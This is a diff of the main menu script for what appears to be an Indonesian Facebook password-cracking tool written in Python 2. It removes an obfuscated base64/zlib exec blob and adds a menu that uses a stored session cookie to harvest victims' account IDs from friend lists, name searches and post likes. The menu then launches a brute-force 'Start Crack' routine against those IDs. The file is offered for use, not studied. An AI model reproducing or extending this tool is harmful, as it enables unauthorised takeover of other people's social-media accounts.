@@ -1,2 +1,97 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("eJwlkLcSo1YAAHt/hcfV3eA5cioBCZEzCOh4gAABjxy/3nfjdrfZ2aYfh3n9++4a8C/IlpKh/irPMv/xB/wqynzox7lclh//u1+Aof7AovzxT6kdHTbnPpQTwbWUMkZkT3OxcsldRQOP9vHcl+sBFbpc12+x3gS/mBwbbJ+b51uUCbRuFSnIRQWt8Khgo9ylgxq267qREEVw0t801JR4BG2acEJ4gW6ZvYHPRboDIymDYAEqcR9QOsFN6/qQi/O0TTf5SUMbYQxXGRWIiSrIKotZ+zt7tc7hTjwzPrszGiOmtJW1SVs3npFF945KTwrveXAdY5tQyqTEUrXOEPJOfG99+iyhpfGt4qgFsaROL3mzxrrDvgMQguPqHpZvRSOQsGrtCKzxC+48zjXrEzaKygKpyvhNFbgliJ1+3AVsyGca9VjKMfj1MvjzrTlZNemNajJd7EXbMaADFN57yFLdssQE8RgsnkIaYTlYX1p8UBh4kpxpyt4Oq4RL5Jve+Ch1LMw4T+3PpZMTnPb5p/V6vfGzua34fLdcdq+zbOC92uZ3rFUWx8sZWCOx2YT+HZdh63myCNlnkyFU4K23xtpW5RrvhEN4SKCGM+gG2yJm9iFshwK7KDmNOisir/bgdME3nI8upe8K2Hml0TJgWHoI8ayqJ5jLrZp9SZ6N7YWYw/44mLQ1IYMIHxosFRhFjphVi/8k8knH8dtgm+kzSQTWrUiZu5xZhabtqdeWLM362D5IP1/Qus9URiCJe2ulaedcXwDm08TC2lGz5SrT+fc930P31mcRDuiGPN5M6t+XwbsZbBwnmpjCjyaFcqDB2KT0cFfrcLoXyvkiZ+Z6oiuSybyJ6Xw3gntyLyLyhxARRPnr53UlxIONXUwdYGfBKP17qKn9YwaOIgWbDWiqpkgd9SuyjoRMOAC912t8RGTMsvitnjefZkrBuw0yCp6vaFjuPJnlAwvYKUiFt3EcsAQjUJj+weIX0cOXjalJfd2G+OiGkXLiNPi+IDRe93Ck7xCzUl6LSN73Skc9BlbOagE6uvAtz6Nu+SVDCkG+8CaFO2M3jCWvn4Y4lZhYwlfu2srjCce+ynPdpQvrSQPaA6RKTYFF+5SnM2UuBY5LNLSIH7437bWRl8les5ro5ZrX5NMjooQBlizNcJJsvjufOu96OZkvLqxSDif348e9SHMXl1U2CppoJHiafAgV2k9UPFX1HZhTr/er3kkqho0n8zL2uEq4Fh2kZrsnf3ppR67ZGIPr2jBXZHN8Poq677RHEmlOsxpGIrY3GG6wv4yNAHwOnuCzScS4EnCN6PybCN1lDmYzAajitb51NrlxvxuCUJwCeWkjX/Vqvg+/6omAhFdvFdsJ58FDd14VsXYZv91URR1sLlhe3X7hkaex7ElFXxcf3firWob0SFdBMlKSsiVyWhtC/tbzsTEIw90YnURWnBs5NCsc//jVc1yik8i1I2meHa/F5t40r9BRvOlCvJupvqfVXvKz8I14LsbrJoJ5bN2k8UIEGmk9p9sbpNy44JTWhSA9F9cz/XGt4jSedNfWrhu9NcqqWQmM1ODu3kKiBGIoM46gaPWe8KIp//n58+d/m6oE1A==")))
+#!usr/bin/python2.7
+# coding=utf-8
+
+import os, time
+from app import config
+from app import login
+from app import crack
+from src import friends_list
+from src import friends
+from src import search_name
+from src import likes
+from bs4 import BeautifulSoup as parser
+
+class Brute(object):
+	def __init__(self, url):
+		self.url = url
+		self.config = config.Config()
+		self.cookie = self.config.loadCookie()
+                self.menu = ''
+		self.menu += ' \033[0;97m[\033[0;96m01\033[0;97m] Dump Id Teman\n'
+		self.menu += ' \033[0;97m[\033[0;96m02\033[0;97m] Dump Id Daftar Teman\n'
+		self.menu += ' \033[0;97m[\033[0;96m03\033[0;97m] Dump Id Pencarian Nama\n'
+		self.menu += ' \033[0;97m[\033[0;96m04\033[0;97m] Dump Id Dari Like Status\n'
+		self.menu += ' \033[0;97m[\033[0;96m05\033[0;97m] Start Crack\n'
+		self.menu += ' \033[0;97m[\033[0;96m06\033[0;97m] Hapus Cookies\n'
+		self.menu += ' \033[0;97m[\033[0;96m07\033[0;97m] Update Tools\n'
+ 		self.menu += ' \033[0;97m[\033[0;91m00\033[0;97m] Exit\n'
+                self.menu += '\033[0;94m──────────────────────────────────────────────────'''
+		if self.cookie == False:
+			login.loginFb(self, self.url, self.config)
+			self.cookie = self.config.loadCookie()
+
+	def start(self):
+		response = self.config.httpRequest(self.url+'/profile.php', self.cookie).encode('utf-8')
+		if 'mbasic_logout_button' in str(response):
+			self.main(response)
+		else:
+			os.remove('log/cookies.log')
+			print('\n\033[0;91m[WARNING] Cookies Salah!')
+			raw_input('\n[ Press Enter]')
+			login.loginFb(self, self.url, self.config)
+			self.cookie = self.config.loadCookie()
+			self.start()
+			exit()
+
+	def main(self, response):
+		os.system('clear')
+		print(self.config.banner())
+		html = parser(response, 'html.parser')
+		print('\033[0;94m──────────────────────────────────────────────────')
+		print('\033[0;97m [\033[0;95m×\033[0;97m] \033[0;96mNama Akun \033[0;91m:\033[0;93m '.decode('utf-8')+html.title.text.upper())
+		print('\033[0;94m──────────────────────────────────────────────────')
+		print(self.menu)
+		try:
+			choose = int(raw_input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m '))
+		except ValueError:
+			exit('\n\033[0;91mLihat Menu Dong Ajg')
+		if choose == 1 or choose == 01:
+			exit(friends_list.main(self, self.cookie, self.url, self.config))
+		elif choose == 2 or choose == 02:
+			exit(friends.main(self, self.cookie, self.url, self.config))
+		elif choose == 3 or choose == 03:
+			exit(search_name.main(self, self.cookie, self.url, self.config))
+		elif choose == 4 or choose == 04:
+			exit(likes.main(self, self.cookie, self.url, self.config))
+		elif choose == 5 or choose == 05:
+			exit(crack.Brute().main())
+		elif choose == 7 or choose == 07:
+                        print('\n\n\033[0;94m   Mohon Tunggu Sedang Meng Update Tools\n')
+			time.sleep(2)
+                        os.system('git pull')
+                        print(' \n\033[0;97m[\033[0;92m✓\033[0;97m]\033[0;92m Berhasil Di Update!\n')
+                        time.sleep(2)
+                        os.system('python2 crack.py')
+		elif choose == 0 or choose == 00:
+                        print('\033[0;92m\n Terimakasih Sudah Memakai Tools Saya Jangan Lupa\n Subscribe My YouTube Channel...\n')
+                        time.sleep(2)
+                        os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
+			os.system('exit')
+			os.system('exit')
+		elif choose == 6 or choose == 06:
+			ask = raw_input('\n\033[0;97mApakah Kamu Yakin \nIngin Menghapus Cookies? [y/n]\033[0;91m :\033[0;94m ')
+			if ask.lower() == 'y':
+				print('\n \033[0;97mMengahapus cokiies\033[0;92m...')
+				time.sleep(2)
+				os.remove('log/cookies.log')
+				print('\n\033[0;92mberhasil Terhapus!')
+				time.sleep(2)
+				login.loginFb(self, self.url, self.config)
+				self.cookie = self.config.loadCookie()
+				self.start()
+			else:
+				self.cookie = self.config.loadCookie()
+				print('\n\033[0;95mBatal!')
+				self.start()
+		else: exit('\n\033[0;91mLihat Menu Dong Ajg')
+
